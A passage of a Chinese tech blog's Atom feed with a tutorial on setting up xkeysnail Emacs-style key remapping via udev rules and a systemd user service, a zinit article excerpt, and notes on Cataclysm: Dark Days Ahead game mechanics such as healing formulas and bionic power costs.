&lt;p&gt;读到这里的读者建议先尝试一下 p10k（&lt;s&gt;如果很满意就不用往下看了&lt;/s&gt;）。&lt;/p&gt;
&lt;p&gt;我已经去掉了配置文件中所有的 zinit 延迟加载语句，不过 zinit 即使去掉延迟加载功能仍然十分强大，我还是选择继续使用 zinit。&lt;br&gt;
而且如果加载了特别耗时的插件的话，zinit 仍然是有用的。&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a class=&quot;headerlink&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/zdharma/zinit&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Zinit&lt;/a&gt; 是个冷门但是却强大无比的 zsh 插件管理器，它拥有一个 killer feature —— Turbo mode，可以让插件在后台加载。这意味这你可以先加载最重要的插件，比如语法高亮和自动建议，剩下的可以统统放到后台加载，让你的 zsh 尽快进入可用状态。&lt;/p&gt;
&lt;p&gt;利用这个机制，zinit 可以将 zsh 的启动时间缩短到几十毫秒——以我的配置为例，只需要 35 毫秒左右。而使用传统的插件管理器比如 antigen，需要近 200 毫秒才能加载完成。&lt;/p&gt;
&lt;p&gt;这里有一张图，对比了不同插件管理器的速度（来源：&lt;a href=&quot;https://gist.github.com/laggardkernel/4a4c4986ccdcaf47b91e8227f9868ded&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Comparison of ZSH frameworks and plugin managers&lt;/a&gt;）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/vintersnow/zsh_plugin_manager_speed/master/result.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;可以看到 zinit 在插件数目变多时速度……似乎更快了？？？&lt;br&gt;
什么鬼，这个大概是实验误差吧，也有可能是第一次启动时编译了自身所以后面变快了。不过 zinit 的速度是毋庸置疑的，哪怕这个插件需要数十秒来加载，只要放在后台加载，一样不影响你的 zsh 启动。&lt;/p&gt;
&lt;p&gt;然而！！这个工具虽然强大，却没多少名气，让人倍感惋惜。&lt;/p&gt;
&lt;p&gt;所以写下这篇文章，希望能有更多人了解到这个工具。&lt;br&gt;
不过本文只涉及了它强大功能的冰山一角，深入研究推荐阅读 &lt;a href=&quot;https://zdharma.org/zinit/wiki/INTRODUCTION/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Zinit Wiki&lt;/a&gt; 和 Zinit 的 &lt;a href=&quot;https://github.com/zdharma/zinit/blob/master/README.md&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;README&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;（虽然说是冰山一角，本文的内容也足以覆盖绝大多数情况了）&lt;/p&gt;
&lt;p&gt;（如果你很懒不想研究的话，文末还有一份完整的示例配置，安装完成后可以直接使用）&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://www.aloxaf.com/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
      <category term="zsh" scheme="https://www.aloxaf.com/tags/zsh/"/>
    
      <category term="教程" scheme="https://www.aloxaf.com/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>xkeysnail 使用指南</title>
    <link href="https://www.aloxaf.com/2019/11/xkeysnail_tutorial/"/>
    <id>https://www.aloxaf.com/2019/11/xkeysnail_tutorial/</id>
    <published>2019-11-03T07:33:49.000Z</published>
    <updated>2019-11-03T07:33:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="emacs-keybings-everywhere"><a class="headerlink" href="#emacs-keybings-everywhere"></a>Emacs keybings Everywhere!</h1><h2 id="简介"><a class="headerlink" href="#简介"></a>简介</h2><p>xkeysnail 是一个非常强大的 keyboard remapping 工具, 它类似于 xmodmap, 但更为灵活. 不仅能重映射键位, 还能重映射快捷键, 甚至能在不同的程序下使用不同的映射!</p><p>再也不用两套快捷键换来换去了!! ( 早点知道这个东西, 我就不至于练就一身无缝切换快捷键的毫无卵用的本领了...</p><p>项目地址: <a href="https://github.com/mooz/xkeysnail" target="_blank" rel="noopener">https://github.com/mooz/xkeysnail</a></p><a id="more"></a><h2 id="安装"><a class="headerlink" href="#安装"></a>安装</h2><h3 id="arch-linux"><a class="headerlink" href="#arch-linux"></a>Arch Linux</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pikaur -S xkeysnail</span><br></pre></td></tr></table></figure><h3 id="other"><a class="headerlink" href="#other"></a>Other</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install xkeysnail --user</span><br></pre></td></tr></table></figure><p>注: 官方文档里使用的是 <code>sudo pip</code> 来安装, 但不推荐这样做. 尤其是 pip 这种辣鸡包管理器, 很容易把系统的包管理搞乱.</p><h2 id="用法"><a class="headerlink" href="#用法"></a>用法</h2><p>首先下载 <a href="https://github.com/mooz/xkeysnail/blob/master/example/config.py" target="_blank" rel="noopener">官方示例</a>, 然后用以下命令执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo xkeysnail config.py</span><br></pre></td></tr></table></figure><p>不出意外地话应该没有报错, 然可以切换到一个不支持 Emacs 快捷键的环境, 比如浏览器. 试一下 C-a, C-e 等基本的快捷键是否能工作.</p><p>如果遇到 <code>Xlib.error.DisplayConnectionError: Can't connect to display &quot;:0.0&quot;: b'No protocol specified\n'</code> 这样的错误, 可以尝试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xhost +SI:localuser:root</span><br><span class="line">sudo xkeysnail config.py</span><br></pre></td></tr></table></figure><p>其中 xhost 命令需要通过 <code>pacman -S xorg-xhost</code> 安装</p><p>如果你有热插拔键盘的需求, 还需要加上 <code>-watch</code> 开关</p><h2 id="编写-config-py"><a class="headerlink" href="#编写-config-py"></a>编写 <a href="http://config.py" target="_blank" rel="noopener">config.py</a></h2><p>如果你是 Emacs user 的话, 基本上直接使用官方配置就行了...最多加一下白名单, 比如我的 Alacritty 和 JB 家的 IDE 都是 Emacs 风格快捷键, 就可以排除它们了.</p><blockquote><p>运行 <code>xprop WM_CLASS</code>, 然后点击目标窗口, 就可以获得这个窗口的 wm_class</p></blockquote><p>如果打算自己编写的话也非常容易, 官方示例有详细的注释, 可以照着示例来写.</p><p>我遇到的唯一一个坑是我的 Compose 键占用了右 Ctrl, 然后导致有些快捷键不起作用 ( 我也不知道为什么这些快捷键会使用右 Ctrl...)<br>所以如果你配置了其他键盘映射程序建议暂时关掉, 免得出现莫名其妙的错误.</p><h2 id="自动启动"><a class="headerlink" href="#自动启动"></a>自动启动</h2><p>启动 xkeysnail 后, 我们基本上可以在每个应用里都愉快地使用 Emacs 风格的快捷键了.<br>但是还缺一个自动启动, 推荐编写一个 systemd 服务来完成. ( systemd 是个好东西, 应该多多使用 )</p><h3 id="赋予当前用户必要权限"><a class="headerlink" href="#赋予当前用户必要权限"></a>赋予当前用户必要权限</h3><p>这个步骤的目的是让 xkeysnail 不需要 root 权限也能执行.</p><p>首先我们增加一个 uinput 组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd uinput</span><br></pre></td></tr></table></figure><p>然后将当前用户添加到 input 和 uinput 组中<br>( 这个步骤似乎并不是即时生效的, 执行完这条命令可以用 <code>groups</code> 查看一下当前用户所属的组, 如果没有 input &amp; uinput 的话可以重启或者重新登录试试 )</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -a -G input,uinput $USER</span><br></pre></td></tr></table></figure><p>然后编写两个 udev 规则, 放在 <code>/etc/udev/rules.d/</code> 下</p><p>input.rules</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KERNEL=="event*", NAME="input/%k", MODE="660", GROUP="input"</span><br></pre></td></tr></table></figure><p>uinput.rules</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KERNEL=="uinput", GROUP="uinput"</span><br></pre></td></tr></table></figure><p>接着应用这两条规则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo udevadm control --reload-rules &amp;&amp; udevadm trigger</span><br></pre></td></tr></table></figure><h3 id="编写-service"><a class="headerlink" href="#编写-service"></a>编写 service</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://qiita.com/samurai20000@github/items/2e1d779e806a7e8543d6</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=xkeysnail</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="comment"># DISPLAY 的值应该和 `echo $DISPLAY` 的值相同</span></span><br><span class="line"><span class="attr">Environment</span>=DISPLAY=:<span class="number">0</span></span><br><span class="line"><span class="attr">ExecStartPre</span>=-xhost +SI:localuser:root</span><br><span class="line"><span class="comment"># 此处禁用了按键状态的输出, 因为我不想要一大堆毫无卵用的日志...</span></span><br><span class="line"><span class="attr">ExecStart</span>=xkeysnail -q /home/aloxaf/.config/xkeysnail/config.py</span><br><span class="line"><span class="attr">Type</span>=simple</span><br><span class="line"><span class="attr">Restart</span>=always</span><br><span class="line"><span class="attr">RestartSec</span>=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=default.target</span><br></pre></td></tr></table></figure><p>将以上代码保存为 <code>~/.config/systemd/user/xkeysnail.service</code>,<br>然后执行 <code>systemctl --user --now enable xkeysnail.service</code>.</p><p>完成了! 享受到处都能使用 Emacs 风格快捷键的快感吧!</p><p>顺便列举下 systemd 的常用操作 ( 推荐 <code>alias userctl='systemctl --user'</code>)</p><ul><li><code>userctl status xkeysnail.service</code> 查看服务状态</li><li><code>userctl restart xkeysnail.service</code> 重启服务</li><li><code>journalctl --user -u xkeysnail.service</code> 查看完整日志</li><li><code>journalctl --user -f -u xkeysnail.service</code> 查看最近日志</li></ul><p>参考资料: <a href="https://qiita.com/samurai20000@github/items/2e1d779e806a7e8543d6%60" target="_blank" rel="noopener">https://qiita.com/samurai20000@github/items/2e1d779e806a7e8543d6`</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;emacs-keybings-everywhere&quot;&gt;&lt;a class=&quot;headerlink&quot; href=&quot;#emacs-keybings-everywhere&quot;&gt;&lt;/a&gt;Emacs keybings Everywhere!&lt;/h1&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a class=&quot;headerlink&quot; href=&quot;#简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;
&lt;p&gt;xkeysnail 是一个非常强大的 keyboard remapping 工具, 它类似于 xmodmap, 但更为灵活. 不仅能重映射键位, 还能重映射快捷键, 甚至能在不同的程序下使用不同的映射!&lt;/p&gt;
&lt;p&gt;再也不用两套快捷键换来换去了!! ( 早点知道这个东西, 我就不至于练就一身无缝切换快捷键的毫无卵用的本领了...&lt;/p&gt;
&lt;p&gt;项目地址: &lt;a href=&quot;https://github.com/mooz/xkeysnail&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/mooz/xkeysnail&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://www.aloxaf.com/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
      <category term="emacs" scheme="https://www.aloxaf.com/tags/emacs/"/>
    
      <category term="教程" scheme="https://www.aloxaf.com/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>CDDA 幸存者笔记</title>
    <link href="https://www.aloxaf.com/2019/09/cdda_note/"/>
    <id>https://www.aloxaf.com/2019/09/cdda_note/</id>
    <published>2019-09-15T04:16:01.000Z</published>
    <updated>2020-02-26T16:28:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>是幸存者笔记，绝不是开发者笔记</p><a id="more"></a><h1 id="破解保险箱"><a class="headerlink" href="#破解保险箱"></a>破解保险箱</h1><h2 id="需求"><a class="headerlink" href="#需求"></a>需求</h2><ul><li>听力正常</li><li>听诊器 或 听力增强CBM</li></ul><h2 id="算法"><a class="headerlink" href="#算法"></a>算法</h2><ol><li><p>如果不满足需求, 只能直接拨动刻度盘, 每次花费 10s, 有 $\frac{1}{30^3}$ 的几率成功</p></li><li><p>满足要求, 则开始计算破解耗时</p></li><li><p><code>耗时 = MAX(150 - 20 * (机械学 - 3) - 10 * (感知 - 8), 30) 分钟</code></p></li><li><p><code>行动点数 = 耗时(秒) * 100</code></p></li></ol><h1 id="安装生化插件"><a class="headerlink" href="#安装生化插件"></a>安装生化插件</h1><h2 id="需求-v2"><a class="headerlink" href="#需求-v2"></a>需求</h2><ul><li>无故障的无菌生化插件</li></ul><h2 id="算法-v2"><a class="headerlink" href="#算法-v2"></a>算法</h2><h3 id="计算生化操作技能"><a class="headerlink" href="#计算生化操作技能"></a>计算生化操作技能</h3><ol><li><code>等级 = 智力 * 4 + 主技能 * 4 + 次技能 * 3 + 最次技能 * 1</code></li><li>若职业为住院医师/生化外科医生, <code>等级 += 3</code></li><li>若职业为人体强化协会会员/全自动医疗仪专家, <code>等级 += 7</code></li><li><code>等级 = 等级 - MIN(40, 等级 - 等级 / 10)</code></li></ol><h3 id="计算安装成功率"><a class="headerlink" href="#计算安装成功率"></a>计算安装成功率</h3><ol><li>若开启 MOD &quot;完全可靠的医疗仪&quot;, 并且使用全自动医疗仪安装, 则成功率 100%</li><li>计算生化操作技能等级: 若有全自动医疗仪, 则技能主次顺序为: 急救, 计算机学, 电子学. 反之顺序为: 电子学, 急救, 机械学.</li><li>计算协助智力点数，增加到生化操作技能上</li><li><code>难度参数 = 生化操作技能 / (4 * 生化插件安装难度)</code></li><li><code>成功率 = (100 * 难度参数) / 难度参数 + sqrt(难度参数)</code></li><li><code>耗时 = 难度参数 * 20分钟</code></li></ol><h2 id="备注"><a class="headerlink" href="#备注"></a>备注</h2><p>生化插件安装难度可查询: <a href="https://cdda-trunk.aloxaf.cn" target="_blank" rel="noopener">https://cdda-trunk.aloxaf.cn</a></p><h1 id="回血速率"><a class="headerlink" href="#回血速率"></a>回血速率</h1><h2 id="自然回血-无视吧-太少了"><a class="headerlink" href="#自然回血-无视吧-太少了"></a>自然回血（无视吧，太少了）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">at_rest_quality = <span class="keyword">if</span> sleep <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">// 基本恢复速率, 曾经是 <span class="number">0.01</span></span><br><span class="line">heal_rate = <span class="number">0.0001</span></span><br><span class="line">// 最终恢复速率</span><br><span class="line">final_rate = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">// healing_awake 参考</span><br><span class="line">// 急速自愈 <span class="number">2.0</span>    高速自愈 <span class="number">0.66</span>   快速自愈 <span class="number">0.2</span>   高速新陈代谢 <span class="number">0.2</span></span><br><span class="line">// 虚弱   <span class="number">-0.002</span>   衰退   <span class="number">-0.02</span>   解体   <span class="number">-0.08</span></span><br><span class="line">awake_rate = heal_rate * mutation_value(<span class="string">"healing_awake"</span>)</span><br><span class="line"><span class="keyword">if</span> awake_rate &gt; <span class="number">0</span>:</span><br><span class="line">    final_rate += awake_rate</span><br><span class="line"><span class="keyword">elif</span> at_rest_quality &lt; <span class="number">1</span>:</span><br><span class="line">final_rate += (<span class="number">1</span> - at_rest_quality) * awake_rate</span><br><span class="line"></span><br><span class="line">// healing_rest 参考</span><br><span class="line">// 急速自愈 <span class="number">1.5</span>    高速自愈   <span class="number">0.5</span>    快速自愈  <span class="number">0.5</span>   高速新陈代谢 <span class="number">0.5</span></span><br><span class="line">// 虚弱   <span class="number">-0.25</span>   慢速自愈  <span class="number">-0.25</span>   自愈弱化 <span class="number">-0.66</span>   自愈无效   <span class="number">-0.9</span></span><br><span class="line">asleep_rate = <span class="number">0.0</span></span><br><span class="line"><span class="keyword">if</span> at_rest_quality &gt; <span class="number">0</span>:</span><br><span class="line">alseep_rate = at_rest_quality * heal_rate * (<span class="number">1</span> + mutation_value(<span class="string">"healing_rest"</span>))</span><br><span class="line"><span class="keyword">if</span> alseep_rate &gt; <span class="number">0.0</span>:</span><br><span class="line">final_rate += asleep_rate * (<span class="number">1</span> + healthy / <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">// 身强力壮 <span class="number">0.2</span> 钢筋铁骨 <span class="number">0.3</span>   不可战胜 <span class="number">0.4</span></span><br><span class="line">// 小个子 <span class="number">-0.05</span> 毫不起眼 <span class="number">-0.25</span> 瘦弱 <span class="number">-0.25</span>  体型细小 <span class="number">-0.3</span>  弱不禁风 <span class="number">-0.5</span> 柴毁骨立 <span class="number">-0.75</span></span><br><span class="line">primary_hp_mod = mutation_value( <span class="string">"hp_modifier"</span> );</span><br><span class="line"><span class="keyword">if</span> primary_hp_mod &lt; <span class="number">0.0</span>:</span><br><span class="line">// HP mod can<span class="string">'t get below -1.0</span></span><br><span class="line"><span class="string">final_rate *= 1.0f + primary_hp_mod;</span></span><br></pre></td></tr></table></figure><h3 id="tl-dr"><a class="headerlink" href="#tl-dr"></a>TL;DR</h3><p>首先基本回血速率 0.0001（以前是 0.01）。</p><p>清醒回血速率为基本回血速率<strong>乘上</strong>特性加成，默认为 0（也就是不回血），最高可以由急速自愈提供 2.0 的加成。<br>睡眠回血速率为基本回血速率<strong>乘上</strong>特性加成，默认为 1（也就是只提供基本回血），最高急速自愈提供 2.5，最低自愈无效提提供 0.1（不增反减）。然后睡眠回血速率还会受到健康（-200~200）影响，最高翻倍，最低归 0（完全不回血）。</p><p>最终回血速率：白天就是清醒回血速率，晚上为两个相加，然后这个值再<strong>乘上</strong>特性加成，最高不可战胜提供 1.4，最低柴毁骨立提供 0.25。</p><p>这个数值非常小……一个没有任何特性健康为 0 的正常人睡 8 个小时大概能自然回血 3 点……</p><h2 id="科学回血"><a class="headerlink" href="#科学回血"></a>科学回血</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">rate_medicine = <span class="number">0.0</span></span><br><span class="line">bandaged_rate = <span class="number">0.0</span></span><br><span class="line">disinfected_rate = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// HEAL_RATE  base_mods=<span class="number">2</span>  scaling_mods=<span class="number">2</span></span><br><span class="line">// HEAL_TORSO base_mods=<span class="number">50</span></span><br><span class="line">// HEAL_TORSO base_mods=<span class="number">150</span></span><br><span class="line">// level  <span class="number">1</span><span class="number">-2</span>(极差) <span class="number">3</span><span class="number">-4</span>(不佳) <span class="number">5</span><span class="number">-6</span>(普通) <span class="number">7</span><span class="number">-8</span>(好)</span><br><span class="line">// <span class="number">9</span><span class="number">-10</span>(良好) <span class="number">11</span>~<span class="number">12</span>(优秀) <span class="number">13</span><span class="number">-14</span>(出色) <span class="number">15</span><span class="number">-16</span>(完美)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">effect</span>:</span>:get_amount(arg):</span><br><span class="line">    ret = get(<span class="string">"base_mods"</span>) + get(<span class="string">"scaling_mods"</span>) * (min(<span class="number">8</span>, level) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bandaged:</span><br><span class="line">    bandaged_rate += bandaged.get_amount(<span class="string">"HEAL_RATE"</span>) / <span class="number">24</span>hours</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> body_part = head:</span><br><span class="line">    bandaged_rate *= bandaged.get_amount(<span class="string">"HEAL_HEAD"</span>) / <span class="number">100</span></span><br><span class="line">    <span class="keyword">if</span> body_part = torso:</span><br><span class="line">        bandaged_rate *= bandaged.get_amount(<span class="string">"HEAL_TORSO"</span>) / <span class="number">100</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> disinfected:</span><br><span class="line">    disinfected_rate += disinfected.get_amount(<span class="string">"HEAL_RATE"</span>) / <span class="number">24</span>hours</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> body_part = head:</span><br><span class="line">    disinfected_rate *= disinfected.get_amount(<span class="string">"HEAL_HEAD"</span>) / <span class="number">100</span></span><br><span class="line">    <span class="keyword">if</span> body_part = torso:</span><br><span class="line">        disinfected_rate *= disinfected.get_amount(<span class="string">"HEAL_TORSO"</span>) / <span class="number">100</span></span><br><span class="line"></span><br><span class="line">rate_medicine += bandaged_rate + disinfected_rate</span><br><span class="line">rate_medicine *= <span class="number">1.0</span> + mutation_value(<span class="string">"healing_resting"</span>)</span><br><span class="line">rate_medicine *= <span class="number">1.0</span> + at_rest_quality</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bandaged <span class="keyword">and</span> disinfected:</span><br><span class="line">    rate_medicine *= <span class="number">2</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> healthy &gt; <span class="number">0</span>:</span><br><span class="line">    rate_medicine *= <span class="number">1.0</span> + healthy / <span class="number">200</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    rate_medicine *= <span class="number">1.0</span> + healthy / <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">primary_hp_mod = mutation_value( <span class="string">"hp_modifier"</span> );</span><br><span class="line"><span class="keyword">if</span> primary_hp_mod &lt; <span class="number">0.0</span>:</span><br><span class="line">// HP mod can<span class="string">'t get below -1.0</span></span><br><span class="line"><span class="string">rate_medicine *= 1.0f + primary_hp_mod;</span></span><br></pre></td></tr></table></figure><h3 id="tl-dr-v2"><a class="headerlink" href="#tl-dr-v2"></a>TL;DR</h3><p>运用医学手段后的回血，分为包扎回血和消毒回血，两者算法一致，主要受包扎/消毒效果影响。“极差”没有加成，“好”及以上可以翻八倍。其中头部和身体会再乘上特殊加成，头部 0.5，身体 1.5。</p><p>最终回血数值等于包扎回血加上消毒回血，再乘上特性加成（默认 1，最高急速自愈 2.5，最低自愈无效 0.1），如果在睡觉的话再翻倍，如果同时包扎&amp;消毒就再翻倍，然后再乘上健康（取值 -200~200）加成（满值翻倍，负满值减半），然后如果有改变HP上限的特性（身强力壮、弱不禁风等等），也等比例应用到回血数值上。</p><p>一个没有特性健康为 0 正常人极差包扎+极差消毒，睡 8 个小时，四肢能回血 5 点。看起来很少，毕竟是“极差”的处理，如果是“良好”的话，这个数字就可以达到 40。所以提升急救学等级 &amp; 使用更高级的包扎/消毒材料就很有必要了。</p><h2 id="关于健康"><a class="headerlink" href="#关于健康"></a>关于健康</h2><p>虽然表面上说健康值范围是 -200~200，但通过饮食能达到的健康值上限基本为 10。同时因为辐射等原因健康值可能暴跌到负三四百甚至五六百。这个时候回血就会变成负值。。。</p><h1 id="生化插件能耗改动"><a class="headerlink" href="#生化插件能耗改动"></a>生化插件能耗改动</h1><p>9702 以后，生化能量使用了焦耳热单位，最小单位为 mJ，同时由于数据类型的限制带来了一个上限：2147483647mJ，大约是 2100 kJ。因为是数据类型本身带来的限制，这个上限不大可能改变了。</p><p>当然这样生化插件就被削地不成样子了，于是 9748 后，生化插件的耗能也开始进行改动，究竟是强了还是弱了并不好说，把数据列举出来各位自行判断。（不过值得吐槽的是 CBM 界面的耗能显示没有调整，导致很多插件耗能显示为 0……）</p><p>注：1 W 即 1 J/s，也就是 1 J/回合。“1 J; 1 W”表示启动耗能 1 J，功率 1W</p><table><thead><tr><th>插件名</th><th>旧版耗能</th><th>新版耗能</th></tr></thead><tbody><tr><td>肾上腺素泵</td><td>50 kJ</td><td>5 J</td></tr><tr><td>警报系统</td><td>1 / 600 kW</td><td>1 W</td></tr><tr><td>单分子刀刃</td><td>200 kJ</td><td>50 J</td></tr><tr><td>霰弹枪臂</td><td>5 kJ</td><td>50 J</td></tr><tr><td>血液分析</td><td>25 kJ</td><td>100 J</td></tr><tr><td>血液过滤</td><td>75 kJ</td><td>600 J</td></tr><tr><td>连锁闪电</td><td>125 kJ</td><td>100 kJ</td></tr><tr><td>生化合金爪</td><td>100 kJ</td><td>25 J</td></tr><tr><td>恒温机</td><td>1 kJ ; 1 / 24 kW</td><td>100 J ; 100 W</td></tr><tr><td>隐身系统</td><td>50 kJ ; 50 kW</td><td>30 kJ ; 30 kW</td></tr><tr><td>近身格斗强化</td><td>1 kJ ; 1 kW</td><td>20 J / 20 W</td></tr><tr><td>定向 EMP</td><td>100 kJ</td><td>50 kJ</td></tr><tr><td>EMP 发射器</td><td>20 kJ</td><td>50 kJ</td></tr><tr><td>湿气凝水器</td><td>200 kJ</td><td>720 kJ</td></tr><tr><td>绝缘电容系统</td><td>1 J ; 1 / 2 kW</td><td>5 J ; 5 W</td></tr><tr><td>闪光弹生成器</td><td>125 kJ</td><td>10 kJ</td></tr><tr><td>脑壳手电</td><td>1 kJ ; 1 / 150 kW</td><td>3 J ; 3 W</td></tr><tr><td>LED纹身</td><td>1 kJ ; 1 / 300 kW</td><td>1 J ; 1 W</td></tr><tr><td>内置辐射计</td><td>25 kJ</td><td>100 J</td></tr><tr><td>声纳之足</td><td>5 kJ ; 1 kW</td><td>200 J ; 200 W</td></tr><tr><td>热能防护</td><td>4 kJ ; 4 kW</td><td>1 kJ ; 1 kW</td></tr><tr><td>液压肌肉</td><td>17 kJ ; 17 kW</td><td>10 kJ ; 10 kW</td></tr><tr><td>红外视觉</td><td>5 kJ ; 1 kW</td><td>5 J / 5 W</td></tr><tr><td>指端激光枪</td><td>50 kJ</td><td>30 kJ</td></tr><tr><td>白细胞培育系统</td><td>10 kJ ; 1 / 3600  kW</td><td>5 J ; 5 W</td></tr><tr><td>指端开锁器</td><td>25 kJ</td><td>50 J</td></tr><tr><td>掌心电磁铁</td><td>50 kJ</td><td>10 kJ</td></tr><tr><td>记忆增强</td><td>10 kJ ; 1 / 600 kW</td><td>2 J ; 2 W</td></tr><tr><td>气象识别</td><td>10 kJ</td><td>10 J</td></tr><tr><td>人工黑夜制造机(注：范围从 15 缩小到 2 ）</td><td>15 kJ ; 15 kW</td><td>9 kJ ; 9 kW</td></tr><tr><td>植入式夜视仪</td><td>1 kJ ; 1 / 1000 kW</td><td>10 J ; 10 W</td></tr><tr><td>量子移动（待机）</td><td>1 kJ ; 1 kW</td><td>3 J ; 3 W</td></tr><tr><td>辐射清洗系统</td><td>50 kJ</td><td>4.5 kJ</td></tr><tr><td>远程控制（未改动）</td><td>1 / 24 kW</td><td>10 W</td></tr><tr><td>形象化嗅觉</td><td>1 kJ ; 1 / 6 kW</td><td>2 J ; 2 W</td></tr><tr><td>神奇闪避</td><td>1 kJ ; 1 / 10 kW</td><td>6 J ; 6 W</td></tr><tr><td>体液萃取</td><td>50 kJ</td><td>20 kJ</td></tr></tbody></table><h1 id="车辆"><a class="headerlink" href="#车辆"></a>车辆</h1><h2 id="越野性能"><a class="headerlink" href="#越野性能"></a>越野性能</h2><ol><li>轮胎面积计算: 轮胎直径 * 轮胎宽度</li><li>轮胎越野系数: 塑料轮子 0.1, 竞赛车轮 0.3, 越野车轮 0.7, 履带 0.9, 轨道轮 0.05, 普通轮子 0.5</li><li>轮胎牵引面积: 轮胎总面积 * 轮胎平均越野系数</li><li>无牵引比例: 1 